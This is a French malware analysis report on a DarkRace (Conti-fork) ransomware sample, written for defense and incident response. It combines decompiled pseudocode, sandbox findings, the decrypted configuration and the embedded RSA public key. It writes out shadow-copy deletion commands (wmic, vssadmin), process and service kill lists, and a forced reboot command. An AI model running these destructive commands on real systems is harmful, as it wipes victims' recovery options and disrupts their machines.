# DarkRace Ransomware — Analyse détaillée (statique + Any.RUN)

Langue : Français | English version: [README_EN.md](README_EN.md)

**Sample :** `74b5e2d90daaf96657e4d3d800bb20bf189bb2cf487479ea0facaf6182e0d1d3`  
**Famille :** DarkRace (fork Conti) — tag Any.RUN : `ransomware` / YARA **DONEX**  
**Any.RUN :** https://any.run/report/74b5e2d90daaf96657e4d3d800bb20bf189bb2cf487479ea0facaf6182e0d1d3/2eaa5cab-4493-475c-a5f5-7898cd493df6  
**Task ID :** `2eaa5cab-4493-475c-a5f5-7898cd493df6` (Win10 19044 x64, durée 660s, UAC autoconfirm)  
**Sources :** PE + Hex-Rays 9.1 (`*.c`) + sandbox Any.RUN (2026-08-20)

> Analyse défensive / IR uniquement. Le binaire n’a pas été exécuté hors sandbox tierce.

---

## 0. Synthèse Any.RUN ↔ code

| Observation Any.RUN | Confirmation code |
|---------------------|-------------------|
| Verdict *Malicious* / Ransomware / YARA **DONEX** | Conti-family (DarkRace branding) |
| PID **7008** : rename fichiers + encryption | `sub_4026C0` / `sub_4039D0` |
| Drop `Readme.3fe57B660.txt` + `*.3fe57B660` | extension overlay + `Readme.%ls.txt` |
| `1.bat` + `taskkill` Office/browsers/DB | thread `StartAddress` + `<kill_keep>` |
| `ping 127.0.0.1` delay | boucle `:start` du bat + cleanup final |
| Self-delete via `cmd` | `sub_402F40` : `del %s` (path malware) |
| **System reboot** | `shutdown_system=true` → `shutdown -r -f -t 0` |
| Reboot forcé puis retour login | `shutdown_system=true` (preuve visuelle : screen_15) |
| Pas de C2 malware (réseau = bruit Windows) | ransomware offline ; contact via TOR/Tox/mail dans la note |
| Tags : `donex` | alias famille Conti-like chez Any.RUN |

**Fichiers observés (exemples) :**
- `C:\Users\admin\Desktop\currencypost.rtf.3fe57B660`
- `C:\Users\admin\Desktop\Readme.3fe57B660.txt`
- `C:\Users\admin\Documents\Database1.accdb.3fe57B660`

---

## 1. Point d’entrée — masquer la console puis enchaîner

```c
// main @ 0x4035C0
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  HWND WindowA = FindWindowA("ConsoleWindowClass", *argv);
  ShowWindow(WindowA, 0);          // cache la fenêtre console
  lpFileName = *argv;              // chemin du PE (pour self-delete + lecture clé overlay)
  sub_4030D0(...);                 // init
  sub_403340(...);                 // chiffrement
  sub_402F40();                    // cleanup + reboot
}
```

**Any.RUN :** exécution manuelle (notepad parent mentionné en INFO) → malware lancé → pas de fenêtre visible.

---

## 2. Init `sub_4030D0` — mutex, config, VSS, clé, icône

### 2.1 Single-instance via mutex — **pourquoi**

```c
// tout au début de sub_4030D0, AVANT config / VSS / chiffrement
if (CreateMutexA(0, 1, "CheckMutex") && GetLastError() == 183) // ERROR_ALREADY_EXISTS
{
  ExitProcess(...);   // déjà une instance → on sort immédiatement
}
```

**Ce que fait l’API**

- `CreateMutexA(lpMutexAttributes=NULL, bInitialOwner=TRUE, "CheckMutex")` crée (ou ouvre) un **objet nommé** dans le namespace kernel Windows.
- Le nom `"CheckMutex"` est **global à la session / machine** : toutes les instances du PE voient le même objet.
- Si le mutex **existait déjà**, `CreateMutexA` réussit quand même (handle ouvert) **mais** `GetLastError()` vaut `183` (`ERROR_ALREADY_EXISTS`).
- Dans ce cas le code **quitte tout de suite**, sans toucher aux fichiers ni relancer VSS/threads.

**Pourquoi le ransomware en a besoin**

1. **Éviter un double chiffrement destructeur**  
   Relancer le PE pendant qu’une première instance tourne (double-clic, script d’opérateur, persistence maladroite, GPO / PsExec rejoué) relancerait walk + encrypt sur des fichiers **déjà** en `.3fe57B660`, avec une **nouvelle** clé session Salsa20 et un **nouveau** footer RSA. Résultat typique Conti/DarkRace : fichiers corrompus / **irrécupérables même après paiement**. Le mutex protège la « qualité » de l’attaque (et la réputation du groupe évoquée dans la note).

2. **Ne pas multiplier les effets de bord**  
   Sans garde-fou : 2× `1.bat` (boucles `taskkill`), 2× arrêts de services (`vss`, SQL, Veeam…), 2× `vssadmin` / `wmic`, 2× clear des event logs, risque de 2× `shutdown -r`. Charge I/O et chaos système inutiles, détection plus bruyante, machine parfois inutilisable avant la fin du run.

3. **Sérialiser le run d’encryption**  
   Le modèle est : **une** instance → génère **une** clé session → chiffre avec **cette** clé → footer RSA unique cohérent. Le mutex garantit cette invariant « 1 infection = 1 contexte crypto ».

4. **IoC / détection (effet collatéral pour la défense)**  
   Le nom fixe `"CheckMutex"` est trivial à chasser (`CreateMutex` / handle nommé). Ce n’est pas de la furtivité : c’est de la **fiabilité opérationnelle** héritée de Conti, prioritaire sur l’évasion à ce stade.

**Ordre volontaire dans le code**

Le test est la **première** action de `sub_4030D0`, avant XOR de la config, admin check, destruction VSS, génération de clé, icône, recycle bin. Si une instance tourne déjà, la seconde ne laisse presque **aucune** trace supplémentaire (pas de drop `1.bat`, pas de nouveaux fichiers chiffrés).

**En résumé** : `CheckMutex` = verrou « une seule course d’encryption à la fois », pour ne pas se tirer une balle dans le pied (double encrypt / double kill / double reboot), pas pour cacher le malware.

### 2.2 Déchiffrement de la config XML (XOR 0xA9) — process détaillé

La config n’est **pas** en clair dans le PE : c’est un blob XML chiffré par XOR, stocké en `.data`, déchiffré **en mémoire** au runtime, puis parsé avec **Mini-XML** (`MXML_*`).

#### Étape A — Localisation dans le PE

| Élément | VA (ImageBase `0x400000`) | Section | Offset fichier | Rôle |
|---------|---------------------------|---------|----------------|------|
| Blob config | `0x435000` (`xmmword_435000`) | `.data` | `0x33200` | XML XOR-chiffré, longueur `0x5A45` (23109 octets utiles une fois trimés) |
| Clé XOR | `0x4295D0` (`xmmword_4295D0`) | `.rdata` | `0x27FD0` | 16 octets : `A9 A9 A9 … A9` |

Le malware ne lit pas un fichier externe : il XOR le buffer **statique déjà mappé** dans son image.

#### Étape B — Algorithme (code Hex-Rays)

```c
// sub_4030D0 — juste après CheckMutex
for (i = 0; i < 0x5A40; i += 64) {
  // 4 blocs SSE de 16 octets : blob[i..] ^= key[0..15]
  // clé = xmmword_4295D0
}
for (; i < 0x5A45; ++i)          // 5 octets restants
  blob[i] ^= 0xA9;               // même octet que la clé

// puis parse Mini-XML → arbre global
dword_43E0EC = sub_410750(..., blob, sub_4120E0);  // mxml_load_string-like
```

**Propriétés crypto :** XOR monooctet / clé 16×`0xA9` → trivial à inverser (même opération). Objectif = anti-strings / anti-YARA basique, pas confidentialité réelle.

#### Étape C — Extraction offline (reproductible)

Fichiers produits à la racine :

| Fichier | Contenu |
|---------|---------|
| `darkrace_config_decrypted.xml` | XML **complet** (23 109 octets), y compris `<ico>` base64 |
| `darkrace_config_readable.xml` | Même XML, `<ico>` tronqué pour lecture humaine |
| `extract_config.py` | Script de re-extraction |

```bash
python3 extract_config.py 74b5e2d90daaf96657e4d3d800bb20bf189bb2cf487479ea0facaf6182e0d1d3 \
  -o darkrace_config_decrypted.xml
```

Cœur de l’algo :

```python
key = pe[key_off:key_off+16]          # 16 × 0xA9
blob = bytearray(pe[blob_off:blob_off+0x5A45])
for i in range(0, 0x5A40, 16):
    for j in range(16):
        blob[i+j] ^= key[j]
for i in range(0x5A40, 0x5A45):
    blob[i] ^= 0xA9
# trim au dernier '>' → XML UTF-8 valide
```

#### Étape D — Parse runtime (comment le malware s’en sert)

Après `mxml_load`, les lookups se font par **nom de balise** :

```c
node = sub_4105B0(root, root, "walk_thread", ...);  // trouve <walk_thread>
val  = sub_401990(node);                            // texte du nœud → "15"
```

Liste des balises présentes dans **ce** sample :

`white_extens`, `white_files`, `white_folders`, `kill_keep`, `services`, `black_db`, `encryption_thread`, `walk_thread`, `local_disks`, `network_shares`, `kill_processes`, `kill_services`, `shutdown_system`, `delete_eventlogs`, `cmd` (×2), `content`, `ico`.

#### Étape E — Config extraite (intégrale, hors icône)

```xml
<?xml version='1.0' encoding='UTF-8'?>
<root>
  <white_extens>386;adv;ani;bat;bin;cab;cmd;com;cpl;cur;deskthemepack;diagcab;diagcfg;diagpkg;dll;drv;exe;hlp;icl;icns;ico;ics;idx;lnk;mod;mpa;msc;msp;msstyles;msu;nls;nomedia;ocx;prf;ps1;rom;rtp;scr;shs;spl;sys;theme;themepack;wpx;lock;key;hta;msi;pdb;search-ms</white_extens>
  <white_files>bootmgr;autorun.inf;boot.ini;bootfont.bin;bootsect.bak;desktop.ini;iconcache.db;ntldr;ntuser.dat;ntuser.dat.log;ntuser.ini;thumbs.db;GDIPFONTCACHEV1.DAT;d3d9caps.dat</white_files>
  <white_folders>$recycle.bin;config.msi;$windows.~bt;$windows.~ws;windows;boot;program files;program files (x86);programdata;system volume information;tor browser;windows.old;intel;msocache;perflogs;x64dbg;public;all users;default;microsoft;appdata</white_folders>
  <kill_keep>sql;oracle;mysq;chrome;veeam;firefox;excel;msaccess;onenote;outlook;powerpnt;winword;wuauclt</kill_keep>
  <services>vss;sql;svc$;memtas;mepocs;msexchange;sophos;veeam;backup;GxVss;GxBlr;GxFWD;GxCVD;GxCIMgr</services>
  <black_db>ldf;mdf</black_db>
  <encryption_thread>30</encryption_thread>
  <walk_thread>15</walk_thread>
  <local_disks>true</local_disks>
  <network_shares>false</network_shares>
  <kill_processes>true</kill_processes>
  <kill_services>true</kill_services>
  <shutdown_system>true</shutdown_system>
  <delete_eventlogs>true</delete_eventlogs>
  <cmd>wmic shadowcopy delete /nointeractive</cmd>
  <cmd>vssadmin Delete Shadows /All /Quiet</cmd>
  <content>
            ~~~ DarkRace ransomware ~~~
    ... (note Tor / Tox / darkrace@onionmail.org) ...
  </content>
  <ico>... ~20 KB base64 → C:\ProgramData\icon.ico ...</ico>
</root>
```

#### Étape F — À quoi sert chaque champ (mapping comportement)

| Balise | Valeur (ce sample) | Effet |
|--------|--------------------|-------|
| `white_*` | listes `;`-séparées | exclusions walk (ne pas chiffrer) |
| `kill_keep` | sql;oracle;… | contenu de `1.bat` / `taskkill` |
| `services` | vss;sql;veeam;… | motifs d’arrêt SCM |
| `black_db` | ldf;mdf | priorisation / chemins SQL |
| `walk_thread` / `encryption_thread` | 15 / 30 | parallélisme |
| `local_disks` / `network_shares` | true / **false** | scope du walk |
| `kill_processes` / `kill_services` | true / true | active killer + stop services |
| `shutdown_system` | **true** | `shutdown -r` en fin |
| `delete_eventlogs` | true | clear Application/System/Security |
| `cmd` | wmic + vssadmin | pré-chiffrement (si admin) |
| `content` | note DarkRace | `Readme.<ext>.txt` |
| `ico` | base64 | `icon.ico` + assoc. HKCR |

**Pourquoi XOR + XML embarqué :** un seul binaire « buildé » par campagne ; l’opérateur change threads, shares, note, icône sans recompiler la logique Conti. Le XOR évite que `strings` affiche la note / les commandes VSS en clair.

### 2.3 Exécution des `<cmd>` — condition, commandes exactes, effets

Ce bloc tourne dans `sub_4030D0` **après** le déchiffrement XML, **avant** la génération de clé / le walk / le chiffrement. Objectif unique de ce sample : **détruire les Volume Shadow Copies (VSS)** pour empêcher une restauration locale sans payer.

#### 2.3.1 Précondition : droits administrateur (`sub_402DD0(1)`)

```c
v2 = sub_402DD0(1);   // 1 = exiger le SID Administrators *et* le flag enabled
...
if (v2) {
  // boucle sur tous les nœuds <cmd> de la config
}
```

Ce que fait `sub_402DD0` précisément :

1. Ouvre le token du thread, sinon celui du process (`OpenThreadToken` / `OpenProcessToken`).
2. Lit `TokenGroups`.
3. Construit le SID **BUILTIN\Administrators** :
   - `AllocateAndInitializeSid(SECURITY_NT_AUTHORITY, 2, 0x20, 0x220, …)`
   - soit `S-1-5-32-544`.
4. Cherche ce SID dans les groupes du token.
5. Comme l’argument vaut `1`, retourne aussi le bit **`SE_GROUP_ENABLED`** (`(Attributes >> 2) & 1`) : le compte doit être admin **et** le privilège réellement actif (pas seulement « admin denied by UAC » / groupe présent mais disabled).

| Résultat `sub_402DD0(1)` | Conséquence |
|--------------------------|-------------|
| `0` (pas admin / UAC filtered) | **Aucune** des `<cmd>` n’est lancée. Le reste du ransomware continue (chiffrement, note, etc.). |
| `1` (admin élevé) | Exécution de **chaque** `<cmd>` de la config. |

Sur Any.RUN (UAC autoconfirm, user `admin`) → les commandes partent bien.

#### 2.3.2 Contournement WOW64 (process 32-bit sur OS 64-bit)

Le PE est **PE32**. Avant les `WinExec` :

```c
Wow64DisableWow64FsRedirection(&OldValue);   // si IsWow64Process == TRUE
// ... WinExec des cmd ...
Wow64RevertWow64FsRedirection(OldValue);
```

Sans ça, `cmd.exe` / outils système pourraient être résolus vers `SysWOW64` au lieu de `System32`. Le malware force la vue **native 64-bit** le temps d’appeler `wmic` / `vssadmin`.

#### 2.3.3 Boucle d’exécution — commandes **exactement** lancées

```c
for (node = first_xml("cmd"); node; node = next_xml("cmd")) {
  strcpy(buf, "cmd /c \"");
  strcat(buf, node_text);   // contenu brut de <cmd>
  strcat(buf, "\"");        // ferme la guillemet
  WinExec(buf, SW_HIDE);    // uCmdShow = 0
}
```

Dans **ce** sample, la config contient **deux** balises `<cmd>` → **deux** processus `cmd.exe` séparés :

| # | Ligne config | Ligne réellement exécutée via `WinExec` |
|---|--------------|------------------------------------------|
| 1 | `wmic shadowcopy delete /nointeractive` | `cmd /c "wmic shadowcopy delete /nointeractive"` |
| 2 | `vssadmin Delete Shadows /All /Quiet` | `cmd /c "vssadmin Delete Shadows /All /Quiet"` |

Ordre = ordre XML (d’abord WMIC, puis VSSADMIN). Pas d’attente explicite entre les deux (`WinExec` ne bloque pas sur la fin du process) : les deux partent presque en parallèle / à la suite rapide, toujours **avant** `CryptGenRandom` / encrypt.

#### 2.3.4 Commande 1 — `wmic shadowcopy delete /nointeractive`

**Outil :** `wmic.exe` (Windows Management Instrumentation Command-line).  
**Classe WMI :** `Win32_ShadowCopy`.  
**Action :** `delete` sur **toutes** les instances shadow copy visibles.  
**`/nointeractive` :** pas de prompt de confirmation.

**Ce que ça engendre concrètement :**

- Suppression des **clichés de volume** (snapshots VSS) listés par WMI.
- Impact utilisateur / admin :
  - onglet **Versions précédentes** des fichiers/dossiers → vide ou erreur ;
  - restaurations basées sur ces snapshots → impossibles ;
  - certains softs de backup / agents qui s’appuient sur ces shadow copies WMI → échec ponctuel.
- Événements typiques : activité WMI + disparition des `Shadow Copy ID` ; parfois logs System autour du service VSS.
- **Ne chiffre rien** et **ne touche pas** aux fichiers utilisateur : ça enlève uniquement le filet de secours local.

Limite : selon l’OS / politique, WMIC peut être déprécié ou restreint ; d’où la 2ᵉ commande en filet.

#### 2.3.5 Commande 2 — `vssadmin Delete Shadows /All /Quiet`

**Outil :** `vssadmin.exe` (Volume Shadow Copy Administrative interface).  
**`Delete Shadows` :** demande la suppression de shadow copies.  
**`/All` :** **tous** les volumes, **toutes** les shadows (pas seulement le volume système).  
**`/Quiet` :** pas de confirmation, sortie silencieuse.

**Ce que ça engendre concrètement :**

- Appel direct à la stack **VSS** (plus « officiel » / bas niveau que la voie WMI pour beaucoup d’environnements).
- Efface les snapshots restants (y compris ceux que WMIC aurait manqués, ou l’inverse).
- Conséquences IR classiques ransomware :
  - plus de **System Restore** basé sur ces points si les shadows associées sont détruites ;
  - plus de rollback fichier via Previous Versions ;
  - backups « locaux type VSS » (certains outils, hyperviseurs légers, copies shadow-aware) amputés.
- Sur un serveur avec beaucoup de shadows : pic d’I/O / activité du service **VSS** le temps de la suppression.

#### 2.3.6 Pourquoi **deux** commandes qui font « la même chose » ?

| Aspect | WMIC | VSSADMIN |
|--------|------|----------|
| API / chemin | WMI `Win32_ShadowCopy` | CLI native VSS |
| Couverture | Souvent toutes les shadows exposées WMI | `/All` = tous volumes via VSS |
| Robustesse | Peut échouer si WMI cassé / désactivé | Peut échouer si `vssadmin` bloqué par policy |
| Héritage Conti | Pattern classique double-tap anti-recovery | Idem |

C’est du **défense en profondeur offensive** : maximiser la chance qu’**au moins une** des deux réussisse à vider les snapshots. Même logique ATT&CK **T1490 — Inhibit System Recovery**.

#### 2.3.7 Effet global sur la chaîne d’attaque

```
[admin?] ──non──► skip cmd ──► chiffrement quand même
    │
   oui
    ▼
cmd #1  wmic shadowcopy delete /nointeractive
    ▼
cmd #2  vssadmin Delete Shadows /All /Quiet
    ▼
(plus tard) chiffrement Salsa20 + note + éventuel reboot
```

**Ce que la victime perd à ce stade (avant même le encrypt) :**

1. Capacité de restaurer des versions antérieures de fichiers via VSS.
2. Une grande partie des stratégies de recovery « gratuites » post-ransomware (restore previous version, certains scripts `vssadmin list shadows` + copy).
3. Temps / bruit système (WMI + VSS) — IoC utile en SOC, mais **trop tard** pour les données si le encrypt suit.

**Ce que ça n’engendre pas :**

- Pas de suppression des backups **externes** (NAS hors ligne, bandes, snapshots cloud / SAN non VSS Windows, réplicas hors machine).
- Pas d’effet si le process n’est pas admin élevé (les `<cmd>` sont skip).
- Pas de remplacement des `<cmd>` : elles sont 100 % pilotées par la config XML ; un autre build DarkRace/Conti pourrait y mettre d’abord `bcdedit`, `wbadmin`, etc. **Ici** = uniquement les 2 lignes VSS.

#### 2.3.8 Synthèse « engendrer »

| Commande exécutée | Effet technique | Effet pour la victime / IR |
|-------------------|-----------------|----------------------------|
| `cmd /c "wmic shadowcopy delete /nointeractive"` | Delete WMI de toutes les `Win32_ShadowCopy` | Previous Versions / restore local via ces clichés → KO |
| `cmd /c "vssadmin Delete Shadows /All /Quiet"` | Delete VSS `/All` silencieux | Filet anti-recovery renforcé sur tous les volumes |
| Les deux enchaînées en admin | Double destruction des snapshots | Fortement réduit les chances de recovery **sans** backup externe ni clé RSA |

### 2.4 Génération clé session + footer RSA + extension — process détaillé

Toujours dans `sub_4030D0`, **après** les `<cmd>` VSS. C’est le moment où le malware fixe le **contexte crypto de toute la machine** pour ce run.

```c
Block    = sub_4014D0(..., 16);       // ① clé session Salsa20 (16 octets)
lpBuffer = sub_401A30(Block, 0x10);   // ② RSA(pubkey, Block) → footer 512 o + set extension
sub_4033F0();                         // ③ icône / assoc (voir §3)
SHEmptyRecycleBinA(0, 0, 7);          // ④ vide la corbeille
```

Deux globals critiques ensuite utilisés par **tous** les threads d’encryption :

| Variable | Contenu | Usage ultérieur |
|----------|---------|-----------------|
| `Block` | clé session 16 octets (ASCII imprimable) | entrée de `sub_4045F0` / Salsa20 pour XOR des chunks fichier |
| `lpBuffer` | blob **512 octets** = clé session chiffrée RSA | écrit en **fin de chaque fichier** chiffré (`WriteFile(..., 0x200)`) |
| `lpWideCharStr` | extension Unicode, ex. `3fe57B660` | rename `fichier.<ext>` + `Readme.<ext>.txt` |

Sans la clé privée RSA de l’attaquant, `Block` n’est plus récupérable à partir du footer → fichiers illisibles.

---

#### 2.4.1 — `sub_4014D0` : tirage de la clé session

```c
CryptAcquireContextA(..., PROV_RSA_FULL=1, ...);  // sinon CRYPT_NEWKEYSET (8)
CryptGenRandom(hProv, 16, buf);                   // 16 octets CSPRNG Windows
// puis normalisation octet par octet :
buf[i] = (buf[i] % 0x5E) + 32;   // → caractère ASCII dans [0x20 .. 0x7D]
```

**Détail de la normalisation**

- `0x5E` = 94. Plage ASCII imprimable Conti : espace (`0x20`) jusqu’à `}` (`0x7D`).
- Chemin SSE (si CPU OK) : même formule vectorisée (`% 94 + 32`), pas un autre algo.
- Résultat : une clé de **16 caractères affichables**, pas 16 octets binaires bruts.

**Pourquoi faire ça (héritage Conti) ?**

1. La clé Salsa20 reste 128 bits d’entropie *après* réduction modulo 94… en pratique l’entropie est un peu moindre que 128 bits purs (`log2(94^16) ≈ 104.8 bits`), toujours hors brute-force réaliste.
2. Historiquement Conti manipulait parfois la clé comme **string** (debug, structures, imports LibTomCrypt sur buffers texte).
3. Chaque **run** (chaque exécution réussie après mutex) tire une **nouvelle** clé → machines / runs différents ≠ même clé.

**Échec possible :** si `CryptAcquireContext` / `CryptGenRandom` échoue, le flux de retour est dégradé (Hex-Rays montre un `return result` ambigu) — en pratique sur Windows normal le chemin happy-path est pris.

Schéma :

```
CryptGenRandom(16) ──► octets bruts ──► (x % 94) + 32 ──► Block = "clé" 16 chars
```

---

#### 2.4.2 — `sub_401A30(Block, 16)` : encapsuler la clé + fixer l’extension

Cœur hybride **Salsa20 (fichier) + RSA (clé)** :

```
                    ┌─ overlay PE (pubkey + ext) ─┐
Block (16) ──RSA──► │  n (hex), e="010001", ext   │ ──► lpBuffer (512 o)
                    └─────────────────────────────┘
                                      │
                                      └─► lpWideCharStr = L"3fe57B660"
```

**Étapes internes précises**

1. **Init LibTomCrypt**  
   - `sub_4089C0(..., "rsa_encrypt", 11)` : enregistre / sélectionne le primitive RSA encrypt.  
   - Structures `mp_int` / key (`sub_406AD0`, `sub_407C60`, `sub_408770`, `sub_408430`).

2. **Lecture de l’overlay du PE** via `sub_402500` (détail structure §2.5)  
   Pointeur `v4` sur le blob 527 octets collé après `.reloc` :

   | Offset overlay | Taille | Champ | Exemple ce sample |
   |----------------|--------|-------|-------------------|
   | 0 | 512 | Module RSA **en hex ASCII** (256 octets binaires = **RSA-2048**) | `C5A0A7250BB5E100...` |
   | 512 | 6 | Exposant public hex | `010001` (= 65537) |
   | 518 | 9 | Extension fichier | `3fe57B660` |

3. **Copie des champs**
   ```c
   qmemcpy(modulus_hex, v4, 0x200);     // 512 chars hex → n
   memcpy(e_hex, v4+512, 6);            // "010001"
   memcpy(ext_ascii, v4+518, 9);        // "3fe57B660"
   MultiByteToWideChar(..., &lpWideCharStr);
   ```
   Si `n` ou `e` vide → `ExitProcess` (clés absentes = build cassé).

4. **Import de la clé publique**
   ```c
   sub_406E20(N, 16, modulus_hex);   // hex string → big integer N
   sub_406E20(E, 16, e_hex);          // hex → E
   sub_407BB0(rsa_key, N, ..., E);    // construit rsa_key publique
   ```

5. **Chiffrement RSA de la clé session**
   ```c
   footer = malloc(0x200);  memset 0;
   sub_407C90(rsa_key, ..., Size=16, Src=Block, out=footer);
   return footer;   // → global lpBuffer
   ```
   - Entrée : les **16 octets** de `Block`.  
   - Sortie : buffer **512 octets** (`0x200`).  
   - Pour RSA-2048, le ciphertext natif fait **256 octets** ; le buffer 512 est un format Conti (padding zéros / taille fixe historique RSA-4096). Chaque fichier chiffré recevra quand même **exactement 512 octets** en EOF.

**Invariant crypto du run**

- 1 mutex OK → 1 `Block` → 1 `lpBuffer` → **tous** les fichiers de la machine partagent la **même** clé session et le **même** footer RSA.
- L’attaquant, avec la clé privée RSA, déchiffre n’importe quel footer → retrouve `Block` → Salsa20 déchiffre les fichiers.
- Sans privée : footer inutilisable (RSA-2048).

---

#### 2.4.3 — Ce que ça engendre concrètement

| Produit | Où | Effet |
|---------|----|-------|
| `Block` (clé Salsa20) | RAM process | Sert à XOR tous les chunks ; **jamais** écrite en clair sur disque |
| `lpBuffer` (512 o) | RAM, puis EOF de chaque fichier | Seul moyen « officiel » de récupérer la clé après coup |
| `lpWideCharStr` = `3fe57B660` | global | Rename `doc.pdf` → `doc.pdf.3fe57B660` ; note `Readme.3fe57B660.txt` |
| Échec overlay / RSA | ExitProcess | Pas de demi-chiffrement sans pubkey |

**Chaîne fichier (plus tard, §8)**

```
[ chunks XOR-Salsa20(Block) ........ ][ lpBuffer : 512 bytes RSA(Block) ]
                                       ▲
                                  taille_fichier finale = ancienne + 0x200
```

**Any.RUN :** tous les drops finissent en `.3fe57B660` → confirme que l’extension lue à l’overlay a bien été fixée ici, une seule fois, avant le walk.

---

#### 2.4.4 — Suite immédiate dans le même init (hors crypto pure)

Après la clé :

1. **`sub_4033F0`** — décode `<ico>`, écrit `C:\ProgramData\icon.ico`, crée l’assoc HKCR `.<ext>` (détail §3).  
2. **`SHEmptyRecycleBinA(0,0,7)`** — vide la corbeille (flags : pas de UI / pas de confirmation / pas de son). Les fichiers déjà dans `$Recycle.Bin` ne servent plus de recovery facile ; les dossiers recycle restent aussi en `white_folders` pour le walk.

Ces deux actions ne font pas partie du schéma crypto, mais ferment la phase d’**init** avant `sub_403340` (walk/encrypt).

---

#### 2.4.5 — Synthèse

```
VSS détruites (si admin)
        │
        ▼
CryptGenRandom(16) → normalise ASCII → Block          ① clé session
        │
        ▼
Lit overlay PE (n, e, ext) → RSA_encrypt(Block)       ② footer + extension
        │
        ├─► lpBuffer (512 o)  ──► sera collé à chaque fichier
        ├─► lpWideCharStr     ──► .3fe57B660
        ▼
icon.ico + HKCR + EmptyRecycleBin                     ③ cosmétique / anti-recovery léger
        │
        ▼
sub_403340 → threads walk/encrypt (utilisent Block + lpBuffer)
```

### 2.5 Lecture de la clé publique dans l’**overlay** du PE — process détaillé

La clé RSA **publique** (et l’extension) ne sont **pas** dans la config XML. Elles sont **collées à la fin du PE** (overlay), format Conti classique. `sub_401A30` les récupère via `sub_402500` pour encapsuler `Block`.

Fichiers extraits à la racine :

| Fichier | Contenu |
|---------|---------|
| `overlay_rsa_pubkey.bin` | Overlay brut **527 octets** |
| `overlay_rsa_n.hex` | Module RSA (512 chars hex) |
| `overlay_extension.txt` | `3fe57B660` |
| **`rsa_public_key.pem`** | Pubkey **SPKI / X.509** (PEM) — forme standard |
| `rsa_public_key_pkcs1.pem` | Pubkey **PKCS#1** (PEM) |
| `rsa_public_key.der` | Même clé en DER |
| `rsa_public_key.txt` | Fiche complète (n, e, PEM, extension) |

#### Clé publique renseignée (ce sample)

| Champ | Valeur |
|-------|--------|
| Algo | **RSA-2048** |
| Exposant **e** | **65537** (`0x10001`, overlay ASCII `010001`) |
| Extension liée | **`.3fe57B660`** |
| Format overlay | `n` hex (512 chars) \|\| `e` \|\| `ext` (9 chars) |
| Usage | `RSA_encrypt(session_key)` → footer 512 o en EOF de chaque fichier |

**PEM (SubjectPublicKeyInfo)** — fichier `rsa_public_key.pem` :

```pem
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxaCnJQu14QDVsBtCE4BH
BWaOeDzCOEp5HHdZaTPEoY0smRT0LOn4WMFnWNSdEkjlENxVXmh05ecCKV2uMedF
EGDyY7w7hUQ3ij25fXs/rgQeNYpcQwc0e9kwnAZZupEm/ebh3tVyZNp7E0s50yJr
0dcP1mtUhaUJs00vRvSMCmIEYZhYvGluR/4bIe38RpPr7cFi4FmVRkfMI8AJ4ZDf
xTuD4JcHzt9T8/iMy2KhQy0meR/yqUYNDKe5GZ+qL8nj6tsrRHvc4+2Qqk1+tq6u
FGp/YhWs8CEhg3rpGUivfYmN/BMPiGHhSHiZFWnTIhZBDDqz651+YoGLo60nSfpQ
eQIDAQAB
-----END PUBLIC KEY-----
```

**Module n** (hex, 256 octets / 512 chars) :

```
C5A0A7250BB5E100D5B01B4213804705668E783CC2384A791C77596933C4A18D
2C9914F42CE9F858C16758D49D1248E510DC555E6874E5E702295DAE31E74510
60F263BC3B8544378A3DB97D7B3FAE041E358A5C4307347BD9309C0659BA9126
FDE6E1DED57264DA7B134B39D3226BD1D70FD66B5485A509B34D2F46F48C0A62
04619858BC696E47FE1B21EDFC4693EBEDC162E059954647CC23C009E190DFC5
3B83E09707CEDF53F3F88CCB62A1432D26791FF2A9460D0CA7B9199FAA2FC9E3
EADB2B447BDCE3ED90AA4D7EB6AEAE146A7F6215ACF02121837AE91948AF7D89
8DFC130F8861E14878991569D32216410C3AB3EB9D7E62818BA3AD2749FA5079
```

> La **clé privée** correspondante n’est **pas** dans le sample (seul l’attaquant la détient). Cette pubkey sert uniquement à vérifier / reproduire l’encapsulation des footers ; elle ne déchiffre pas les fichiers victimes.

---

#### 2.5.1 — Qu’est-ce qu’un overlay PE ?

Un PE = headers + sections (`.text` … `.reloc`). Tout octet **après** la fin de la dernière section sur disque est de l’**overlay** : ignoré par le chargeur Windows, mais toujours présent dans le fichier.

Sur ce sample :

| Section | PointerToRawData | SizeOfRawData | Fin |
|---------|------------------|---------------|-----|
| `.text` | `0x400` | `0x27600` | `0x27A00` |
| `.rdata` | `0x27A00` | `0xB800` | `0x33200` |
| `.data` | `0x33200` | `0x6600` | `0x39800` |
| `.rsrc` | `0x39800` | `0x200` | `0x39A00` |
| `.reloc` | `0x39A00` | `0x1C00` | **`0x3B600`** |

- Taille fichier = **243 727** octets (`0x3B80F`)
- Fin `.reloc` = **`0x3B600`** (243 200)
- Overlay = `243727 - 243200` = **527 octets** exacts

```
[ MZ/PE ][ .text | .rdata | .data | .rsrc | .reloc ][ ##### OVERLAY 527 B ##### ]
                                                    ▲
                                                 offset 0x3B600
```

**Pourquoi cette technique (Conti) ?**

- Un build = recompiler / patcher seulement l’overlay (`n`, `e`, `ext`) sans retoucher le code.
- `strings` sur `.rdata` ne montre pas forcément le module RSA (ici c’est de l’hex ASCII en fin de fichier).
- Le chargeur n’exécute pas l’overlay → pas de section exécutable suspecte supplémentaire.

---

#### 2.5.2 — `sub_402500` : comment le malware retrouve l’overlay

`lpFileName` a été positionné dans `main` sur `argv[0]` = chemin du binaire lancé.

```c
// 1) Ouvre SON propre fichier
h = CreateFileA(lpFileName, GENERIC_READ, FILE_SHARE_READ|WRITE, ..., OPEN_EXISTING, ...);

// 2) Si échec (ex. chemin UNC / share) : tente WNetAddConnection2A sur le dossier parent, puis réessaie
//    Si toujours KO → ExitProcess

// 3) Charge tout le PE en mémoire
buf = malloc(GetFileSize(h) + 1024);
ReadFile(h, buf, fileSize, ...);
*out_base = buf;   // a1 reçoit le buffer (libéré plus tard par l’appelant)

// 4) Parse PE pour pointer juste APRÈS la dernière section
nt = buf + *(DWORD*)(buf + 0x3C);           // e_lfanew
// logique Conti : fin_dernière_section =
//   PointerToRawData(.reloc) + SizeOfRawData(.reloc)
return buf + 0x39A00 + 0x1C00;              // → buf + 0x3B600  (== début overlay)
```

**Fallback réseau :** si le sample est exécuté depuis un chemin du type `\\server\share\...` et que `CreateFileA` échoue, le code coupe au dernier `\`, fait `WNetAddConnection2A` sur le share, puis réouvre. Objectif : pouvoir lire la pubkey même en déploiement lateral movement / share.

